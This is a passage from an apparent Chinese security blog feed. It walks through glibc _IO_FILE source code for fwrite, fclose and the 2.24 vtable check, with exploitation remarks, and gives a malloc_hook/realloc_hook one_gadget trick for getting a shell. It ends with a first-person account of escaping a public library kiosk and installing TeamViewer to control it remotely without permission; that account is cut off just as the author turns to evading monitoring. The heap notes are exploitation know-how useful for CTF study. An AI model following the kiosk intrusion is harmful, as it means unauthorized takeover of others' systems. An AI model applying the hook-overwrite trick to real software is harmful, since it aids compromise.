title="_IO_SYSWRITE-&gt;_IO_new_file_write"></a>_IO_SYSWRITE-&gt;_IO_new_file_write</h3><p>跟进_IO_SYSWRITE查看输出缓冲区的内容是怎样被输出的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ssize_t</span><br><span class="line">_IO_new_file_write (FILE *f, const void *data, ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t to_do = n;</span><br><span class="line">  while (to_do &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, 0)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      if (count &lt; 0)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (void *) ((char *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  if (f-&gt;_offset &gt;= 0)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  return n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到执行了系统调用__write来将其输出。</p><p>返回之后调用_IO_setg刷新缓冲区指针并返回。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0</span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>返回到_IO_new_file_xsputn中继续往后走，计算了buf是否为比较大的block（0x1000），如果是则直接调用new_do_write进行输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     /* Try to maintain alignment: write a whole number of blocks.  */</span><br><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</span><br><span class="line"></span><br><span class="line">     if (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  if (count &lt; do_write)</span><br><span class="line">    return n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后处理缓冲区剩余数据，将剩余数据输出至输出缓冲区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     /* Now write out the remainder.  Normally, this will fit in the</span><br><span class="line"> buffer, but it&apos;s somewhat messier for line-buffered files,</span><br><span class="line"> so we let _IO_default_xsputn handle the general case. */</span><br><span class="line">     if (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>关于这里只将数据输出到输出缓冲区而没有将其写至文件，其实是主函数会调用 _IO_flush_all_lockp()函数来清空缓冲区，该函数会在下面三种情况下被调用：</p><p>1：当 libc 执行 abort 流程时。</p><p>2：当执行 exit 函数时。当执行流从 main 函数返回时</p><p>3：当执行流从 main 函数返回时</p><h3 id="IO-default-xsputn"><a href="#IO-default-xsputn" class="headerlink" title="_IO_default_xsputn"></a>_IO_default_xsputn</h3><p>这里调用的是_IO_default_xsputn，跟进该函数，跳转到genops.c中的_IO_default_xsputn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">for (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Space available. */</span><br><span class="line">      if (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  if (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  if (count &gt; 20)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (count)</span><br><span class="line">    &#123;</span><br><span class="line">      char *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      ssize_t i;</span><br><span class="line">      for (i = count; --i &gt;= 0; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</span><br><span class="line">break;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这里对剩余大小不同进行了分别处理，如果大于20则调用__memcpy,否则使用for循环直接赋值。最后如果输出缓冲区为0，则直接调用_IO_OVERFLOW输出，之后返回，这个流程基本就结束了。最后看下此时的fp，bcede…是data2中的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_write_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_write_ptr = 0x603494 &quot;&quot;, </span><br><span class="line">_IO_write_end = 0x604480 &quot;&quot;, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;bcdefghij1234567890&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><h2 id="框架-3"><a href="#框架-3" class="headerlink" title="框架"></a>框架</h2><p>主要是对链接入_IO_list_all中的FILE结构体，还有fread，fwrite建立的输入输出缓冲区进行释放处理。</p><h2 id="细节-3"><a href="#细节-3" class="headerlink" title="细节"></a>细节</h2><h3 id="fclose-gt-IO-new-fclose"><a href="#fclose-gt-IO-new-fclose" class="headerlink" title="fclose-&gt;_IO_new_fclose"></a>fclose-&gt;_IO_new_fclose</h3><p>跟进fclose，进入了iofclose.c中的_IO_new_fclose函数，开始先对fp进行了检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHECK_FILE(fp, EOF);</span><br></pre></td></tr></table></figure></p><p>之后第一步：unlink，将fp从_IO_list_all中脱下。<br>这里需要注意下，在后面的利用中，为了能够直接调用_io_finish，会这里进行修改来绕过unlink与io_close</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  /* First unlink the stream.  */</span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure><h4 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h4><p>跟进该函数，是位于genops.c中的_IO_un_link<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_un_link (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line">#endif</span><br><span class="line">      if (_IO_list_all == NULL)</span><br><span class="line">;</span><br><span class="line">      else if (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      else</span><br><span class="line">for (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  if (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure></p><p>可以看到，开始时先检查标志位_flags，之后判断_IO_list_all是否为空，不为空看是否在表头，若不再表头则遍历_IO_list_all单链表进行寻找。最后对其标志位_flags进行修改，该标志位表明了是否位于_IO_list_all链表中。</p><p>返回之后，调用_IO_file_close_it函数关闭释放缓冲区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br></pre></td></tr></table></figure><h4 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h4><p>跟进该函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_close_it (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  int write_status;</span><br><span class="line">  if (!_IO_file_is_open (fp))</span><br><span class="line">    return EOF;</span><br><span class="line"></span><br><span class="line">  if ((fp-&gt;_flags &amp; _IO_NO_WRITES) == 0</span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  else</span><br><span class="line">    write_status = 0;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  int close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == 0</span><br><span class="line">      ? _IO_SYSCLOSE (fp) : 0);</span><br><span class="line"></span><br><span class="line">  /* Free buffer. */</span><br><span class="line">  if (fp-&gt;_mode &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (_IO_have_wbackup (fp))</span><br><span class="line">_IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, NULL, NULL, 0);</span><br><span class="line">      _IO_wsetg (fp, NULL, NULL, NULL);</span><br><span class="line">      _IO_wsetp (fp, NULL, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setb (fp, NULL, NULL, 0);</span><br><span class="line">  _IO_setg (fp, NULL, NULL, NULL);</span><br><span class="line">  _IO_setp (fp, NULL, NULL);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = -1;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  return close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure></p><p>首先通过标志位_fileno 判断了文件是否打开，然后对其标志位进行了判断，目的是判断是否为输出缓冲区，是则调用_IO_do_flush刷新缓冲区。查看_IO_do_flush，发现是宏定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_do_flush(_f) \</span><br><span class="line">  ((_f)-&gt;_mode &lt;= 0      \</span><br><span class="line">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span><br><span class="line">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span><br><span class="line">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span><br><span class="line">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span><br><span class="line">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span><br></pre></td></tr></table></figure></p><p>可以看到主要调用_IO_do_write将输出缓冲区输出。此时原先在输出缓冲区中的值才会被写入文件，所以一般程序运行中没有close的话打开文件可能会发现还没有写进去就是这个原因。再之后对_markers标志位进行了处理。然后可以看到后面调用了_IO_SYSCLOSE函数，看到是fileops.c中的_IO_file_close</p><h4 id="IO-SYSCLOSE-gt-IO-file-close"><a href="#IO-SYSCLOSE-gt-IO-file-close" class="headerlink" title="_IO_SYSCLOSE-&gt;_IO_file_close"></a>_IO_SYSCLOSE-&gt;_IO_file_close</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_file_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  /* Cancelling close should be avoided if possible since it leaves an</span><br><span class="line">     unrecoverable state behind.  */</span><br><span class="line">  return close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_close)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">看到主要调用了close_not_cancel，而它本身是个宏定义，</span><br></pre></td></tr></table></figure><p>#define close_not_cancel(fd) \<br>    __close (fd)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">实际就是通过系统调用__close关闭</span><br><span class="line"></span><br><span class="line">返回之后,调用_IO_setb/_IO_setg/_IO_setp，其中_IO_setb是设置结构体的buf指针， _IO_setg是设置read相关的指针，_IO_setp是设置write相关的指针</span><br></pre></td></tr></table></figure></p><p>  _IO_setb (fp, NULL, NULL, 0);<br>  _IO_setg (fp, NULL, NULL, NULL);<br>  _IO_setp (fp, NULL, NULL);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### _IO_setb</span><br><span class="line">进入_IO_setb，可以看到释放了缓冲区</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_setb (_IO_FILE <em>f, char </em>b, char *eb, int a)<br>{<br>  if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    free (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  if (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  else<br>    f-&gt;_flags |= _IO_USER_BUF;<br>}<br>libc_hidden_def (_IO_setb)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">返回之后，再次调用了_IO_un_link</span><br></pre></td></tr></table></figure></p><p>  _IO_un_link ((struct _IO_FILE_plus *) fp);<br>  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;<br>  fp-&gt;_fileno = -1;<br>  fp-&gt;_offset = _IO_pos_BAD;</p><p>  return close_status ? close_status : write_status;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">返回到_IO_new_close函数，最后调用_IO_FINISH，进入到fileopsc.c中的_IO_new_file_finish</span><br><span class="line"></span><br><span class="line">#### _IO_FINISH-&gt;_IO_new_file_finish  </span><br><span class="line"></span><br><span class="line">看到先检查文件是否仍打开，如果打开就刷新缓冲区并关闭，不过之前已经关闭过了，这里会直接进入genops.c中的_IO_default_finish</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_new_file_finish (FILE *fp, int dummy)<br>{<br>  if (_IO_file_is_open (fp))<br>    {<br>      _IO_do_flush (fp);<br>      if (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))<br>    _IO_SYSCLOSE (fp);<br>    }<br>  _IO_default_finish (fp, 0);<br>}<br>libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### _IO_default_finish</span><br><span class="line">可以看到还是对缓冲区的释放，指针的释放等等</span><br></pre></td></tr></table></figure></p><p>void<br>_IO_default_finish (FILE <em>fp, int dummy)<br>{<br>  struct _IO_marker </em>mark;<br>  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    {<br>      free (fp-&gt;_IO_buf_base);<br>      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = NULL;<br>    }</p><p>  for (mark = fp-&gt;_markers; mark != NULL; mark = mark-&gt;_next)<br>    mark-&gt;_sbuf = NULL;</p><p>  if (fp-&gt;_IO_save_base)<br>    {<br>      free (fp-&gt;_IO_save_base);<br>      fp-&gt;_IO_save_base = NULL;<br>    }</p><p>  _IO_un_link ((struct _IO_FILE_plus *) fp);</p><p>#ifdef _IO_MTSAFE_IO<br>  if (fp-&gt;_lock != NULL)<br>    _IO_lock_fini (*fp-&gt;_lock);</p><p>#endif<br>}<br>libc_hidden_def (_IO_default_finish)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">最后返回后对fp指针进行了free，就结束了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2.24 check</span><br><span class="line"></span><br><span class="line">libc 2.24 之后专门添加了对虚表的检查，分别是/libio/libioP.h中的IO_validate_vtable 与 /libio/vtables.c中的_IO_vtable_check。</span><br><span class="line"></span><br><span class="line">所有的 libio vtables 被放进了专用的只读的 __libc_IO_vtables 段，以使它们在内存中连续。在任何间接跳转之前，vtable 指针将根据段边界进行检查，如果指针不在这个段，则调用函数 _IO_vtable_check() 做进一步的检查，并且在必要时终止进程。</span><br></pre></td></tr></table></figure></p><p>/<em> Perform vtable pointer validation.  If validation fails, terminate<br>   the process.  </em>/<br>static inline const struct _IO_jump_t <em><br>IO_validate_vtable (const struct _IO_jump_t </em>vtable)<br>{<br>  /<em> Fast path: The vtable pointer is within the __libc_IO_vtables<br>     section.  </em>/<br>  uintptr_t section_length = <strong>stop_</strong>libc_IO_vtables - <strong>start_</strong>libc_IO_vtables;<br>  uintptr_t ptr = (uintptr_t) vtable;<br>  uintptr_t offset = ptr - (uintptr_t) <strong>start_</strong>libc_IO_vtables;          </p><p>  /* 对vtable指针范围进行检查，不满足则调用_IO_vtable_check进行检查</p><p>  if (__glibc_unlikely (offset &gt;= section_length))<br>    /<em> The vtable pointer is not in the expected section.  Use the<br>       slow path, which will terminate the process if necessary.  </em>/<br>    _IO_vtable_check ();<br>  return vtable;<br>}</p><p>void attribute_hidden<br>_IO_vtable_check (void)<br>{</p><p>#ifdef SHARED<br>  /<em> Honor the compatibility flag.  </em>/<br>  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</p><p>#ifdef PTR_DEMANGLE<br>  PTR_DEMANGLE (flag);</p><p>#endif<br>  if (flag == &amp;_IO_vtable_check)<br>    return;</p><p>  /<em> In case this libc copy is in a non-default namespace, we always<br>     need to accept foreign vtables because there is always a<br>     possibility that FILE </em> objects are passed across the linking<br>     boundary.  <em>/<br>  {<br>    Dl_info di;<br>    struct link_map </em>l;<br>    if (!rtld_active ()<br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0<br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br>      return;<br>  }</p><p>#else /<em> !SHARED </em>/<br>  /<em> We cannot perform vtable validation in the static dlopen case<br>     because FILE </em> handles might be passed back and forth across the<br>     boundary.  Therefore, we disable checking in this case.  */<br>  if (__dlopen != NULL)<br>    return;</p><p>#endif</p><p>  __libc_fatal (“Fatal error: glibc detected an invalid stdio handle\n”);<br>}</p><p><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;_IO_File 是个比较神奇的东西，而且用起来比较方便，因此花点时间捋一下它的源码，方便后面的精进&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;这里使用glibc 2.23的源码进行调试，需要注意的是2.23版本之后的vtable添加了检查，这里调试的是没有检查的，加了debug s
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="io_file" scheme="http://siriuswhiter.tk/tags/io-file/"/>
    
  </entry>
  
  <entry>
    <title>Problem Solve Tricks</title>
    <link href="http://siriuswhiter.tk/2019/07/06/problem-solve-tricks/"/>
    <id>http://siriuswhiter.tk/2019/07/06/problem-solve-tricks/</id>
    <published>2019-07-06T03:42:41.000Z</published>
    <updated>2019-07-07T15:06:52.437Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc-hook-amp-amp-one-gadget"><a href="#malloc-hook-amp-amp-one-gadget" class="headerlink" title="malloc_hook &amp;&amp; one_gadget"></a>malloc_hook &amp;&amp; one_gadget</h1><p>之前经常遇到one_gadget条件不满足使得最后覆盖malloc_hook之后无法getshell，前两天从ex师傅那里学到了一个好办法。</p><p>将one_gadget 填入realloc_hook处，然后malloc_hook处填上__libc_realloc处的地址，因为调用realloc时会先检测realloc_hook，所以仍然能够调用one_gadget，为了能够满足one_gadget的条件（一般是对栈内存有要求），可以通过realloc代码开始处的寄存器push操作来进行栈帧调整，使得条件满足来getshell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;malloc-hook-amp-amp-one-gadget&quot;&gt;&lt;a href=&quot;#malloc-hook-amp-amp-one-gadget&quot; class=&quot;headerlink&quot; title=&quot;malloc_hook &amp;amp;&amp;amp; one_gadge
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>终端渗透记录-lib</title>
    <link href="http://siriuswhiter.tk/2019/06/15/%E7%BB%88%E7%AB%AF%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95-lib/"/>
    <id>http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/</id>
    <published>2019-06-15T02:39:25.000Z</published>
    <updated>2019-06-18T14:25:10.974Z</updated>
    
    <content type="html"><![CDATA[<p><em>前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来</em></p><p>上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来</p><p>一般触控的主机，长按是相当于鼠标右键的点击的，在主页上打开右键，发现里面有全局设置</p><p>再打开全局设置的话，看到了有关于flash插件播放器的问题，看样子是需要联网的，点击链接会调出浏览器，同时出现的还有加速球hhh，get！</p><p>后面在尝试调用右键的时候经常会半天出不来，这时可以进到关于简介的地方，随便把一句话括起来，就会出现复制打印之类的选项</p><p>选择打印会弹出小框，而且也会弹出加速球，有了加速球其实就好解决了</p><p>加速器本身很难点进去，长按也没啥反应，但是加速球带着网络速度的检查，而在网速检查中，有推荐你清理垃圾的选项hhh</p><p>点击清理垃圾就能够把电脑管家给召唤出来。</p><p>为了能够更方便的操作，先将电脑中的teamviewer升级（ps:神奇的是之前确实是有下好的），但是没法打开，或者是打开也看不到</p><p>类似于是看报的界面是置顶的，在电脑管家中找找还有什么好用的软件，之前在浏览器里下载的搜狗输入法直接被删了，或许是有检测</p><p>但是看样子teamviewer之前就是用电脑管家下的，或许这里的不会被删掉，为了后面更加方便，这里下载了搜狗输入法（ps:不用问没有输入法怎么下的，毕竟榜单前列）</p><p>在看电脑管家工具箱时看到了桌面整理和小Q桌面hhh，尝试使用桌面整理，下载安装完之后，突然出现了桌面hhh</p><p>想打开我的电脑，但是打开就被直接关闭了，后台应该是有应用在监控文件管理器的打开（其实想看有啥东西还是挺简单的，浏览器查看本机文档完全无障碍），想开任务管理器，软键盘欲罢不能</p><p>后面一通操作之后，桌面又出不来了（哭），就勉强使用小Q桌面一用，打开之前升级的teamviewer，电子邮箱不能输入（暴哭）</p><p>到这一步感觉没办法的时候，索性重装一下teamviewer，bingo，远程连接ok了hhh</p><p>不过这样子实在是不安全，万一到时候拿着teamviewer账号找上门就尴尬了，好在先teamviewer控制，后面带电脑过去操控就比较方便了。</p><p>目前的想法，为了能够更方便地控制还不被被监